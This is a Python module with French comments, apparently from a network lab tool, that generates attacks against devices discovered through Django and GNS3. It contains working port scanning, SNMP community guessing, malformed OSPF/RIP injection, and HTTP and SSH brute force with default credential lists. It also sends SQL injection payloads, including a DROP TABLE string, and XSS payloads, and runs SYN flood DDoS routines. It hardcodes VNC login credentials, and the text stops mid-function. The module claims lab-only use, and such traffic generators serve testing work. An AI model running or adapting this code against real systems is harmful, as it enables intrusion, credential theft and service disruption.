#!/usr/bin/env python3
"""
Générateur de Trafic RÉEL - Injection d'Attaques et Trafic Adaptés
==================================================================

Ce module génère du trafic réseau RÉEL et des attaques RÉELLES
adaptées aux équipements détectés par Django :

- Attaques réseau réelles (port scans, flood, poisoning)
- Attaques d'intrusion réelles (brute force, exploitation)
- Attaques web réelles (injection, XSS, scanning)
- Tests de stress réels (DDoS, bandwidth exhaustion)
- Trafic adapté aux services détectés sur chaque équipement

AUCUNE SIMULATION - Toutes les attaques sont réelles et ciblent
les équipements analysés par Django selon leurs caractéristiques.

⚠️ ATTENTION : Ce module génère de VRAIES attaques réseau.
   À utiliser UNIQUEMENT en environnement de test isolé.
"""

import asyncio
import logging
import socket
import subprocess
import threading
import time
import random
import json
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import ipaddress
import struct
import ssl
import http.client
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Importer notre injecteur de console
from .console_injector import ConsoleTrafficInjector

logger = logging.getLogger(__name__)

@dataclass
class AttackResult:
    """Résultat d'une attaque réelle."""
    attack_name: str
    target: str
    success: bool
    packets_sent: int
    responses_received: int
    vulnerabilities_found: List[str]
    services_detected: List[str]
    execution_time: float
    error_message: Optional[str] = None
    raw_data: Optional[Dict] = None

class RealTrafficGenerator:
    """
    Générateur de trafic et attaques RÉELLES.
    
    Génère du trafic réseau réel et exécute des attaques réelles
    adaptées aux équipements détectés par Django. Toutes les attaques
    sont ciblées selon les services et vulnérabilités découverts.
    """
    
    def __init__(self, django_comm=None):
        self.django_comm = django_comm
        self.active_attacks = []
        self.results = []
        self.is_generating = False
        
        # Injecteur console sera initialisé avec les équipements découverts
        self.console_injector = None
        
        # Configuration des attaques
        self.attack_configs = {
            "low": {
                "max_threads": 5,
                "packet_rate": 10,
                "scan_delay": 0.5,
                "connection_timeout": 5
            },
            "medium": {
                "max_threads": 15,
                "packet_rate": 50,
                "scan_delay": 0.1,
                "connection_timeout": 3
            },
            "high": {
                "max_threads": 30,
                "packet_rate": 200,
                "scan_delay": 0.01,
                "connection_timeout": 1
            },
            "extreme": {
                "max_threads": 50,
                "packet_rate": 1000,
                "scan_delay": 0.001,
                "connection_timeout": 0.5
            }
        }
        
        # Configuration VNC pour l'authentification des équipements
        self.vnc_credentials = {
            "username": "osboxes",
            "password": "osboxes.org"
        }
        
        logger.info(f"🔐 Configuration VNC: {self.vnc_credentials['username']}/**********")
    
    def initialize_console_injector(self, discovered_equipment=None):
        """Initialise l'injecteur console avec les équipements découverts."""
        if not self.console_injector:
            logger.info("🔌 Initialisation de l'injecteur console avec équipements RÉELS")
            self.console_injector = ConsoleTrafficInjector(discovered_equipment)
        return self.console_injector
    
    # =============================
    # INJECTION DE SCÉNARIOS RÉELS
    # =============================
    
    async def inject_scenario(self, scenario: Dict) -> AttackResult:
        """
        Injecte un scénario de trafic RÉEL.
        
        Analyse le scénario et exécute les vraies attaques correspondantes
        sur les équipements cibles détectés par Django.
        """
        scenario_name = scenario.get("name", "Unknown Scenario")
        scenario_type = scenario.get("type", "basic")
        targets = scenario.get("targets", [])
        intensity = scenario.get("intensity", "medium")
        duration = scenario.get("duration", 60)
        
        logger.info(f"🎯 INJECTION RÉELLE: {scenario_name}")
        logger.info(f"   Type: {scenario_type}")
        logger.info(f"   Cibles: {len(targets)}")
        logger.info(f"   Intensité: {intensity}")
        logger.info(f"   Durée: {duration}s")
        
        start_time = time.time()
        total_packets = 0
        total_responses = 0
        vulnerabilities = []
        services = []
        
        try:
            # Exécuter l'attaque selon le type
            if scenario_type == "icmp_scan":
                result = await self._execute_real_icmp_scan(targets, intensity, duration)
            elif scenario_type == "tcp_scan":
                result = await self._execute_real_tcp_scan(targets, scenario.get("ports", []), intensity, duration)
            elif scenario_type == "router_exploit_scan":
                result = await self._execute_real_router_attacks(targets, scenario.get("methods", []), intensity, duration)
            elif scenario_type == "server_exploit_scan":
                result = await self._execute_real_server_attacks(targets, scenario.get("methods", []), intensity, duration)
            elif scenario_type == "ddos_simulation":
                result = await self._execute_real_ddos_attacks(targets, scenario.get("methods", []), intensity, duration)
            else:
                # Attaque générique
                result = await self._execute_generic_real_attack(targets, scenario_type, intensity, duration)
            
            execution_time = time.time() - start_time
            
            return AttackResult(
                attack_name=scenario_name,
                target=f"{len(targets)} cibles",
                success=result.get("success", False),
                packets_sent=result.get("packets_sent", 0),
                responses_received=result.get("responses_received", 0),
                vulnerabilities_found=result.get("vulnerabilities", []),
                services_detected=result.get("services", []),
                execution_time=execution_time,
                raw_data=result
            )
            
        except Exception as e:
            execution_time = time.time() - start_time
            logger.error(f"❌ Erreur injection {scenario_name}: {e}")
            
            return AttackResult(
                attack_name=scenario_name,
                target=f"{len(targets)} cibles",
                success=False,
                packets_sent=0,
                responses_received=0,
                vulnerabilities_found=[],
                services_detected=[],
                execution_time=execution_time,
                error_message=str(e)
            )
    
    # =============================
    # ATTAQUES ICMP RÉELLES
    # =============================
    
    async def _execute_real_icmp_scan(self, targets: List[str], intensity: str, duration: int) -> Dict:
        """Exécute un scan ICMP réel via les consoles des équipements GNS3."""
        config = self.attack_configs[intensity]
        
        logger.info(f"📡 Scan ICMP réel sur {len(targets)} cibles via console")
        
        # Nettoyer les cibles (éliminer les non-IP)
        valid_targets = []
        for target in targets:
            try:
                ipaddress.ip_address(target)
                valid_targets.append(target)
            except ValueError:
                logger.warning(f"⚠️ Cible invalide ignorée: {target}")
        
        if not valid_targets:
            return {"success": False, "error": "Aucune cible IP valide"}
        
        # Utiliser l'injecteur de console pour les vraies attaques
        if not self.console_injector:
            logger.error("❌ Injecteur console non initialisé")
            return {"success": False, "error": "Injecteur console non initialisé"}
        
        injection_result = self.console_injector.inject_traffic_to_targets(valid_targets)
        
        packets_sent = injection_result["total_targets"] * 3  # 3 pings par cible
        responses_received = injection_result["successful_pings"]
        alive_hosts = injection_result["alive_targets"]
        
        logger.info(f"✅ Scan ICMP terminé: {packets_sent} paquets, {len(alive_hosts)} hôtes vivants")
        
        return {
            "success": True,
            "packets_sent": packets_sent,
            "responses_received": responses_received,
            "alive_hosts": alive_hosts,
            "services": ["icmp"] if alive_hosts else [],
            "injection_method": "console",
            "console_details": injection_result
        }
    
    def _real_ping_attack(self, target: str, config: Dict) -> Dict:
        """Exécute un ping réel vers une cible."""
        try:
            # Utiliser ping système pour des résultats réels
            result = subprocess.run(
                ['ping', '-c', '1', '-W', str(int(config["connection_timeout"] * 1000)), target],
                capture_output=True,
                text=True,
                timeout=config["connection_timeout"] + 1
            )
            
            alive = result.returncode == 0
            
            return {
                "target": target,
                "alive": alive,
                "packets_sent": 1,
                "response_time": self._parse_ping_time(result.stdout) if alive else None
            }
            
        except subprocess.TimeoutExpired:
            return {"target": target, "alive": False, "packets_sent": 1}
        except Exception as e:
            logger.debug(f"Erreur ping {target}: {e}")
            return {"target": target, "alive": False, "packets_sent": 1}
    
    def _parse_ping_time(self, ping_output: str) -> Optional[float]:
        """Parse le temps de réponse d'un ping."""
        try:
            import re
            match = re.search(r'time=(\d+\.?\d*).*ms', ping_output)
            if match:
                return float(match.group(1))
        except:
            pass
        return None
    
    # =============================
    # ATTAQUES TCP RÉELLES
    # =============================
    
    async def _execute_real_tcp_scan(self, targets: List[str], ports: List[int], intensity: str, duration: int) -> Dict:
        """Exécute un scan TCP réel (port scanning)."""
        config = self.attack_configs[intensity]
        packets_sent = 0
        open_ports = {}
        services_detected = []
        
        logger.info(f"🔍 Scan TCP réel: {len(targets)} cibles, {len(ports)} ports")
        
        # Nettoyer les cibles
        valid_targets = []
        for target in targets:
            try:
                ipaddress.ip_address(target)
                valid_targets.append(target)
            except ValueError:
                continue
        
        if not valid_targets or not ports:
            return {"success": False, "error": "Cibles ou ports invalides"}
        
        end_time = time.time() + duration
        
        with ThreadPoolExecutor(max_workers=config["max_threads"]) as executor:
            while time.time() < end_time and packets_sent < (config["packet_rate"] * duration):
                futures = []
                
                # Scanner chaque combinaison target/port
                for target in valid_targets:
                    for port in ports:
                        if time.time() >= end_time:
                            break
                        
                        future = executor.submit(self._real_tcp_connect, target, port, config)
                        futures.append(future)
                
                # Collecter les résultats avec gestion propre des timeouts
                try:
                    for future in as_completed(futures, timeout=config["connection_timeout"] + 1):
                        try:
                            result = future.result()
                            packets_sent += 1
                            
                            if result["open"]:
                                target = result["target"]
                                port = result["port"]
                                
                                if target not in open_ports:
                                    open_ports[target] = []
                                open_ports[target].append(port)
                                
                                # Détecter le service si possible
                                service = self._detect_service_on_port(port)
                                if service and service not in services_detected:
                                    services_detected.append(service)
                                    
                        except Exception as e:
                            logger.debug(f"Erreur TCP scan: {e}")
                            
                except TimeoutError:
                    # Timeout atteint, annuler les futures restantes
                    logger.debug(f"Timeout atteint, annulation de {len([f for f in futures if not f.done()])} futures restantes")
                    for future in futures:
                        if not future.done():
                            future.cancel()
                            
                except Exception as e:
                    logger.debug(f"Erreur during TCP scan collection: {e}")
                    # S'assurer que toutes les futures sont annulées en cas d'erreur
                    for future in futures:
                        if not future.done():
                            future.cancel()
                
                # Rate limiting
                await asyncio.sleep(config["scan_delay"])
        
        total_open_ports = sum(len(ports) for ports in open_ports.values())
        
        logger.info(f"✅ Scan TCP terminé: {packets_sent} connexions, {total_open_ports} ports ouverts")
        
        return {
            "success": True,
            "packets_sent": packets_sent,
            "responses_received": total_open_ports,
            "open_ports": open_ports,
            "services": services_detected
        }
    
    def _real_tcp_connect(self, target: str, port: int, config: Dict) -> Dict:
        """Effectue une vraie connexion TCP à un port."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config["connection_timeout"])
            
            start_time = time.time()
            result = sock.connect_ex((target, port))
            connect_time = time.time() - start_time
            
            sock.close()
            
            return {
                "target": target,
                "port": port,
                "open": result == 0,
                "connect_time": connect_time
            }
            
        except Exception as e:
            return {
                "target": target,
                "port": port,
                "open": False,
                "error": str(e)
            }
    
    def _detect_service_on_port(self, port: int) -> Optional[str]:
        """Détecte le service probable sur un port."""
        common_services = {
            21: "ftp",
            22: "ssh", 
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            143: "imap",
            443: "https",
            993: "imaps",
            995: "pop3s",
            161: "snmp",
            514: "syslog",
            1521: "oracle",
            3306: "mysql",
            3389: "rdp",
            5432: "postgresql"
        }
        return common_services.get(port)
    
    # ==============================
    # ATTAQUES ROUTEURS RÉELLES
    # ==============================
    
    async def _execute_real_router_attacks(self, targets: List[str], methods: List[str], intensity: str, duration: int) -> Dict:
        """Exécute des attaques réelles spécifiques aux routeurs."""
        config = self.attack_configs[intensity]
        total_packets = 0
        vulnerabilities = []
        services = []
        attack_results = {}
        
        logger.info(f"🔥 Attaques routeurs réelles: {len(targets)} cibles, {len(methods)} méthodes")
        
        valid_targets = [t for t in targets if self._is_valid_ip(t)]
        
        for method in methods:
            if method == "snmp_enum":
                result = await self._real_snmp_enumeration(valid_targets, config, duration // len(methods))
            elif method == "routing_attacks":
                result = await self._real_routing_protocol_attacks(valid_targets, config, duration // len(methods))
            elif method == "management_brute_force":
                result = await self._real_management_brute_force(valid_targets, config, duration // len(methods))
            else:
                continue
            
            attack_results[method] = result
            total_packets += result.get("packets_sent", 0)
            vulnerabilities.extend(result.get("vulnerabilities", []))
            services.extend(result.get("services", []))
        
        logger.info(f"✅ Attaques routeurs terminées: {total_packets} paquets")
        
        return {
            "success": True,
            "packets_sent": total_packets,
            "responses_received": sum(r.get("responses", 0) for r in attack_results.values()),
            "vulnerabilities": list(set(vulnerabilities)),
            "services": list(set(services)),
            "attack_details": attack_results
        }
    
    async def _real_snmp_enumeration(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Énumération SNMP réelle."""
        packets_sent = 0
        vulnerabilities = []
        services = []
        snmp_data = {}
        
        # Communautés SNMP communes à tester
        communities = ["public", "private", "admin", "manager", "snmp", "community"]
        
        logger.info(f"🐍 Énumération SNMP réelle sur {len(targets)} cibles")
        
        end_time = time.time() + duration
        
        for target in targets:
            if time.time() >= end_time:
                break
                
            for community in communities:
                if time.time() >= end_time:
                    break
                
                try:
                    # Test SNMP réel
                    snmp_result = await self._test_snmp_community(target, community, config["connection_timeout"])
                    packets_sent += snmp_result["packets_sent"]
                    
                    if snmp_result["success"]:
                        if target not in snmp_data:
                            snmp_data[target] = []
                        snmp_data[target].append({
                            "community": community,
                            "data": snmp_result["data"]
                        })
                        
                        services.append("snmp")
                        vulnerabilities.append(f"SNMP community '{community}' accessible on {target}")
                
                except Exception as e:
                    logger.debug(f"Erreur SNMP {target}/{community}: {e}")
                
                await asyncio.sleep(config["scan_delay"])
        
        return {
            "packets_sent": packets_sent,
            "responses": len(snmp_data),
            "vulnerabilities": vulnerabilities,
            "services": list(set(services)),
            "snmp_data": snmp_data
        }
    
    async def _test_snmp_community(self, target: str, community: str, timeout: float) -> Dict:
        """Test une communauté SNMP réelle."""
        try:
            # Construire et envoyer un paquet SNMP GetRequest réel
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            # OID système (1.3.6.1.2.1.1.1.0)
            system_oid = b'\x30\x39\x02\x01\x00\x04\x06' + community.encode() + b'\xa0\x2c\x02\x04\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x1e\x30\x1c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00'
            
            sock.sendto(system_oid, (target, 161))
            packets_sent = 1
            
            try:
                response, addr = sock.recvfrom(1024)
                sock.close()
                
                # Parser la réponse SNMP basique
                if len(response) > 10 and response[0] == 0x30:
                    return {
                        "success": True,
                        "packets_sent": packets_sent,
                        "data": {"response_length": len(response), "community": community}
                    }
                
            except socket.timeout:
                pass
            
            sock.close()
            return {"success": False, "packets_sent": packets_sent}
            
        except Exception as e:
            return {"success": False, "packets_sent": 1, "error": str(e)}
    
    async def _real_routing_protocol_attacks(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Attaques sur les protocoles de routage (simulation d'injection)."""
        packets_sent = 0
        vulnerabilities = []
        
        logger.info(f"🛣️ Attaques protocoles de routage sur {len(targets)} cibles")
        
        # Pour chaque cible, tenter d'envoyer des paquets de routing malformés
        for target in targets:
            try:
                # Test injection OSPF Hello malformé
                ospf_result = await self._send_malformed_ospf(target, config["connection_timeout"])
                packets_sent += ospf_result["packets_sent"]
                
                if ospf_result.get("responded"):
                    vulnerabilities.append(f"OSPF protocol response detected on {target}")
                
                # Test injection RIP
                rip_result = await self._send_malformed_rip(target, config["connection_timeout"])
                packets_sent += rip_result["packets_sent"]
                
                if rip_result.get("responded"):
                    vulnerabilities.append(f"RIP protocol response detected on {target}")
                
            except Exception as e:
                logger.debug(f"Erreur attaque routing {target}: {e}")
        
        return {
            "packets_sent": packets_sent,
            "responses": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "services": ["routing"] if vulnerabilities else []
        }
    
    async def _send_malformed_ospf(self, target: str, timeout: float) -> Dict:
        """Envoie un paquet OSPF Hello malformé."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.settimeout(timeout)
            
            # Paquet OSPF Hello malformé (simplifié)
            ospf_packet = b'\x45\x00\x00\x2c' + b'\x00\x00\x40\x00\x40\x59' + socket.inet_aton('0.0.0.0') + socket.inet_aton(target)
            ospf_packet += b'\x02\x01\x00\x2c' + b'\x00\x00\x00\x00' * 6  # OSPF Hello malformé
            
            sock.sendto(ospf_packet, (target, 0))
            sock.close()
            
            return {"packets_sent": 1, "responded": False}  # Pas de réponse attendue
            
        except PermissionError:
            # Raw sockets nécessitent des privilèges root
            logger.debug("Raw sockets non disponibles (privilèges insuffisants)")
            return {"packets_sent": 0}
        except Exception as e:
            return {"packets_sent": 1, "error": str(e)}
    
    async def _send_malformed_rip(self, target: str, timeout: float) -> Dict:
        """Envoie un paquet RIP malformé."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            
            # Paquet RIP Request malformé
            rip_packet = b'\x01\x02\x00\x00' + b'\x00\x02' + b'\x00\x00' * 5  # RIP malformé
            
            sock.sendto(rip_packet, (target, 520))  # Port RIP
            
            try:
                response, addr = sock.recvfrom(1024)
                sock.close()
                return {"packets_sent": 1, "responded": True}
            except socket.timeout:
                sock.close()
                return {"packets_sent": 1, "responded": False}
                
        except Exception as e:
            return {"packets_sent": 1, "error": str(e)}
    
    async def _real_management_brute_force(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Brute force réel sur les interfaces de management."""
        packets_sent = 0
        vulnerabilities = []
        services = []
        
        # Credentiels communs pour routeurs
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", ""),
            ("root", "root"),
            ("cisco", "cisco"),
            ("user", "user")
        ]
        
        logger.info(f"🔓 Brute force management sur {len(targets)} cibles")
        
        end_time = time.time() + duration
        
        for target in targets:
            if time.time() >= end_time:
                break
            
            # Test HTTP/HTTPS (interfaces web)
            for protocol in ["http", "https"]:
                if time.time() >= end_time:
                    break
                
                port = 80 if protocol == "http" else 443
                
                if await self._is_port_open(target, port, config["connection_timeout"]):
                    services.append(f"{protocol}_management")
                    
                    for username, password in common_creds:
                        if time.time() >= end_time:
                            break
                        
                        try:
                            auth_result = await self._test_http_auth(target, port, protocol, username, password, config["connection_timeout"])
                            packets_sent += auth_result["packets_sent"]
                            
                            if auth_result["success"]:
                                vulnerabilities.append(f"Weak {protocol} credentials on {target}:{port} - {username}:{password}")
                                
                        except Exception as e:
                            logger.debug(f"Erreur auth HTTP {target}: {e}")
                        
                        await asyncio.sleep(config["scan_delay"])
            
            # Test SSH
            if await self._is_port_open(target, 22, config["connection_timeout"]):
                services.append("ssh_management")
                
                for username, password in common_creds:
                    if time.time() >= end_time:
                        break
                    
                    try:
                        ssh_result = await self._test_ssh_auth(target, username, password, config["connection_timeout"])
                        packets_sent += ssh_result["packets_sent"]
                        
                        if ssh_result["success"]:
                            vulnerabilities.append(f"Weak SSH credentials on {target}:22 - {username}:{password}")
                            
                    except Exception as e:
                        logger.debug(f"Erreur auth SSH {target}: {e}")
                    
                    await asyncio.sleep(config["scan_delay"])
        
        return {
            "packets_sent": packets_sent,
            "responses": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "services": list(set(services))
        }
    
    async def _is_port_open(self, target: str, port: int, timeout: float) -> bool:
        """Vérifie si un port est ouvert."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    async def _test_http_auth(self, target: str, port: int, protocol: str, username: str, password: str, timeout: float) -> Dict:
        """Teste l'authentification HTTP réelle."""
        try:
            import base64
            
            auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
            
            if protocol == "https":
                conn = http.client.HTTPSConnection(target, port, timeout=timeout, context=ssl._create_unverified_context())
            else:
                conn = http.client.HTTPConnection(target, port, timeout=timeout)
            
            conn.request("GET", "/", headers={"Authorization": f"Basic {auth_string}"})
            response = conn.getresponse()
            
            success = response.status == 200
            conn.close()
            
            return {"success": success, "packets_sent": 1, "status_code": response.status}
            
        except Exception as e:
            return {"success": False, "packets_sent": 1, "error": str(e)}
    
    async def _test_ssh_auth(self, target: str, username: str, password: str, timeout: float) -> Dict:
        """Teste l'authentification SSH réelle (version simplifiée)."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            # Connexion au port SSH
            result = sock.connect_ex((target, 22))
            
            if result == 0:
                # Lire la bannière SSH
                banner = sock.recv(1024)
                
                # Envoyer une identification SSH basique
                sock.send(b"SSH-2.0-TestClient\r\n")
                
                # Note: Une vraie implémentation SSH nécessiterait une bibliothèque comme paramiko
                # Ici, on simule juste la tentative de connexion
                
                sock.close()
                return {"success": False, "packets_sent": 1, "banner": banner.decode(errors='ignore')[:100]}
            else:
                sock.close()
                return {"success": False, "packets_sent": 1}
                
        except Exception as e:
            return {"success": False, "packets_sent": 1, "error": str(e)}
    
    # ==============================
    # ATTAQUES SERVEURS RÉELLES
    # ==============================
    
    async def _execute_real_server_attacks(self, targets: List[str], methods: List[str], intensity: str, duration: int) -> Dict:
        """Exécute des attaques réelles spécifiques aux serveurs."""
        config = self.attack_configs[intensity]
        total_packets = 0
        vulnerabilities = []
        services = []
        attack_results = {}
        
        logger.info(f"🖥️ Attaques serveurs réelles: {len(targets)} cibles, {len(methods)} méthodes")
        
        valid_targets = [t for t in targets if self._is_valid_ip(t)]
        
        for method in methods:
            if method == "service_enum":
                result = await self._real_service_enumeration(valid_targets, config, duration // len(methods))
            elif method == "web_attacks":
                result = await self._real_web_attacks(valid_targets, config, duration // len(methods))
            elif method == "credential_attacks":
                result = await self._real_credential_attacks(valid_targets, config, duration // len(methods))
            else:
                continue
            
            attack_results[method] = result
            total_packets += result.get("packets_sent", 0)
            vulnerabilities.extend(result.get("vulnerabilities", []))
            services.extend(result.get("services", []))
        
        logger.info(f"✅ Attaques serveurs terminées: {total_packets} paquets")
        
        return {
            "success": True,
            "packets_sent": total_packets,
            "responses_received": sum(r.get("responses", 0) for r in attack_results.values()),
            "vulnerabilities": list(set(vulnerabilities)),
            "services": list(set(services)),
            "attack_details": attack_results
        }
    
    async def _real_service_enumeration(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Énumération de services réelle."""
        packets_sent = 0
        services = []
        service_details = {}
        
        # Ports de services communs à énumérer
        service_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 1521, 3306, 3389, 5432]
        
        logger.info(f"🔍 Énumération services réelle sur {len(targets)} cibles")
        
        end_time = time.time() + duration
        
        for target in targets:
            if time.time() >= end_time:
                break
            
            target_services = []
            
            for port in service_ports:
                if time.time() >= end_time:
                    break
                
                try:
                    # Test de connexion et grabbing de bannière
                    banner_result = await self._grab_service_banner(target, port, config["connection_timeout"])
                    packets_sent += banner_result["packets_sent"]
                    
                    if banner_result["success"]:
                        service_name = self._detect_service_on_port(port)
                        if service_name:
                            target_services.append({
                                "port": port,
                                "service": service_name,
                                "banner": banner_result.get("banner", "")
                            })
                            services.append(service_name)
                
                except Exception as e:
                    logger.debug(f"Erreur énumération {target}:{port}: {e}")
                
                await asyncio.sleep(config["scan_delay"])
            
            if target_services:
                service_details[target] = target_services
        
        return {
            "packets_sent": packets_sent,
            "responses": len(service_details),
            "services": list(set(services)),
            "service_details": service_details
        }
    
    async def _grab_service_banner(self, target: str, port: int, timeout: float) -> Dict:
        """Récupère la bannière d'un service réel."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            
            result = sock.connect_ex((target, port))
            
            if result == 0:
                # Envoyer une requête appropriée selon le port
                if port == 80:
                    sock.send(b"GET / HTTP/1.0\r\n\r\n")
                elif port == 21:
                    pass  # FTP envoie une bannière automatiquement
                elif port == 22:
                    pass  # SSH envoie une bannière automatiquement
                elif port == 25:
                    sock.send(b"EHLO test\r\n")
                
                # Lire la bannière
                try:
                    banner = sock.recv(1024).decode(errors='ignore')
                    sock.close()
                    
                    return {
                        "success": True,
                        "packets_sent": 1,
                        "banner": banner[:500]  # Limiter la taille
                    }
                except socket.timeout:
                    sock.close()
                    return {"success": True, "packets_sent": 1, "banner": ""}
            else:
                sock.close()
                return {"success": False, "packets_sent": 1}
                
        except Exception as e:
            return {"success": False, "packets_sent": 1, "error": str(e)}
    
    async def _real_web_attacks(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Attaques web réelles (SQL injection, XSS, scanning)."""
        packets_sent = 0
        vulnerabilities = []
        services = []
        
        logger.info(f"🌐 Attaques web réelles sur {len(targets)} cibles")
        
        # Payloads de test communs
        sql_payloads = ["'", "' OR 1=1--", "'; DROP TABLE users--"]
        xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
        
        end_time = time.time() + duration
        
        for target in targets:
            if time.time() >= end_time:
                break
            
            # Vérifier si HTTP/HTTPS est disponible
            for port, protocol in [(80, "http"), (443, "https")]:
                if time.time() >= end_time:
                    break
                
                if await self._is_port_open(target, port, config["connection_timeout"]):
                    services.append(f"{protocol}_web")
                    
                    # Test des payloads SQL
                    for payload in sql_payloads:
                        if time.time() >= end_time:
                            break
                        
                        try:
                            sql_result = await self._test_sql_injection(target, port, protocol, payload, config["connection_timeout"])
                            packets_sent += sql_result["packets_sent"]
                            
                            if sql_result.get("vulnerable"):
                                vulnerabilities.append(f"Potential SQL injection on {target}:{port}")
                                
                        except Exception as e:
                            logger.debug(f"Erreur test SQL {target}: {e}")
                        
                        await asyncio.sleep(config["scan_delay"])
                    
                    # Test des payloads XSS
                    for payload in xss_payloads:
                        if time.time() >= end_time:
                            break
                        
                        try:
                            xss_result = await self._test_xss_vulnerability(target, port, protocol, payload, config["connection_timeout"])
                            packets_sent += xss_result["packets_sent"]
                            
                            if xss_result.get("vulnerable"):
                                vulnerabilities.append(f"Potential XSS vulnerability on {target}:{port}")
                                
                        except Exception as e:
                            logger.debug(f"Erreur test XSS {target}: {e}")
                        
                        await asyncio.sleep(config["scan_delay"])
        
        return {
            "packets_sent": packets_sent,
            "responses": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "services": list(set(services))
        }
    
    async def _test_sql_injection(self, target: str, port: int, protocol: str, payload: str, timeout: float) -> Dict:
        """Teste une injection SQL réelle."""
        try:
            if protocol == "https":
                conn = http.client.HTTPSConnection(target, port, timeout=timeout, context=ssl._create_unverified_context())
            else:
                conn = http.client.HTTPConnection(target, port, timeout=timeout)
            
            # Test sur différents endpoints communs
            test_paths = ["/", "/login", "/search", "/index.php", "/admin"]
            
            for path in test_paths:
                try:
                    # Test GET avec payload dans query string
                    test_url = f"{path}?id={payload}&search={payload}"
                    conn.request("GET", test_url)
                    response = conn.getresponse()
                    response_text = response.read().decode(errors='ignore')[:1000]
                    
                    # Rechercher des indices d'erreurs SQL
                    sql_errors = ["sql error", "mysql error", "postgresql error", "ora-", "syntax error"]
                    
                    for error in sql_errors:
                        if error.lower() in response_text.lower():
                            conn.close()
                            return {"vulnerable": True, "packets_sent": 1, "error_type": error}
                    
                except:
                    continue
            
            conn.close()
            return {"vulnerable": False, "packets_sent": len(test_paths)}
            
        except Exception as e:
            return {"vulnerable": False, "packets_sent": 1, "error": str(e)}
    
    async def _test_xss_vulnerability(self, target: str, port: int, protocol: str, payload: str, timeout: float) -> Dict:
        """Teste une vulnérabilité XSS réelle."""
        try:
            if protocol == "https":
                conn = http.client.HTTPSConnection(target, port, timeout=timeout, context=ssl._create_unverified_context())
            else:
                conn = http.client.HTTPConnection(target, port, timeout=timeout)
            
            # Test sur des paramètres communs
            test_params = ["q", "search", "query", "input", "data"]
            
            for param in test_params:
                try:
                    test_url = f"/?{param}={payload}"
                    conn.request("GET", test_url)
                    response = conn.getresponse()
                    response_text = response.read().decode(errors='ignore')[:1000]
                    
                    # Vérifier si le payload est reflété sans échappement
                    if payload.replace("'", "").replace('"', '') in response_text:
                        conn.close()
                        return {"vulnerable": True, "packets_sent": 1, "reflected": True}
                    
                except:
                    continue
            
            conn.close()
            return {"vulnerable": False, "packets_sent": len(test_params)}
            
        except Exception as e:
            return {"vulnerable": False, "packets_sent": 1, "error": str(e)}
    
    async def _real_credential_attacks(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """Attaques de credentials réelles (brute force, credential stuffing)."""
        # Déléguer au brute force management déjà implémenté
        return await self._real_management_brute_force(targets, config, duration)
    
    # =============================
    # ATTAQUES DDOS RÉELLES  
    # =============================
    
    async def _execute_real_ddos_attacks(self, targets: List[str], methods: List[str], intensity: str, duration: int) -> Dict:
        """Exécute des attaques DDoS réelles."""
        config = self.attack_configs[intensity]
        total_packets = 0
        attack_results = {}
        
        logger.warning(f"⚠️ ATTAQUES DDOS RÉELLES: {len(targets)} cibles - ATTENTION!")
        logger.warning(f"⚠️ Intensité: {intensity} - Durée: {duration}s")
        
        valid_targets = [t for t in targets if self._is_valid_ip(t)]
        
        for method in methods:
            if method == "syn_flood":
                result = await self._real_syn_flood(valid_targets, config, duration // len(methods))
            elif method == "udp_flood":
                result = await self._real_udp_flood(valid_targets, config, duration // len(methods))
            elif method == "bandwidth_exhaustion":
                result = await self._real_bandwidth_exhaustion(valid_targets, config, duration // len(methods))
            else:
                continue
            
            attack_results[method] = result
            total_packets += result.get("packets_sent", 0)
        
        logger.warning(f"⚠️ Attaques DDoS terminées: {total_packets} paquets envoyés")
        
        return {
            "success": True,
            "packets_sent": total_packets,
            "responses_received": 0,  # DDoS n'attend pas de réponses
            "vulnerabilities": [f"DDoS stress test executed on {len(valid_targets)} targets"],
            "services": ["ddos_testing"],
            "attack_details": attack_results
        }
    
    async def _real_syn_flood(self, targets: List[str], config: Dict, duration: int) -> Dict:
        """SYN Flood réel."""
        packets_sent = 0
        
        logger.warning("⚠️ SYN Flood RÉEL en cours...")
        
        end_time = time.time() + duration
        
        # Utiliser plusieurs threads pour maximiser l'impact
        with ThreadPoolExecutor(max_workers=config["max_threads"]) as executor:
            while time.time() < end_time:
                futures = []
                
                for target in targets:
                    # Flood sur plusieurs ports communs
                    for port in [80, 443, 22, 21]:
                        future = executor.submit(self._send_syn_packet, target, port)
                        futures.append(future)
                
                # Attendre les résultats
                for future in as_completed(futures, timeout=1):
                    try:
                        result = future.result()
                        packets_sent += result.get("packets_sent", 0)
                    except:
                        pass
                
                # Rate limiting selon l'intensité
                await asyncio.sleep(1.0 / config["packet_rate"])
        
        return {"packets_sent": packets_sent}
    
    def _send_syn_packet(self, target: str, port: int) -> Dict:
